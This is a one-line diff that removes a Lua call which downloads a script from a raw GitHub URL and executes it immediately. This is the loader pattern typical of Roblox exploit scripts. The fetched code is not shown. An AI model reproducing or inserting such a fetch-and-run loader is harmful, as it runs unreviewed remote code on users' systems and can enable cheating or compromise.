@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CEOs-Hub/Script/main/.lua"))()
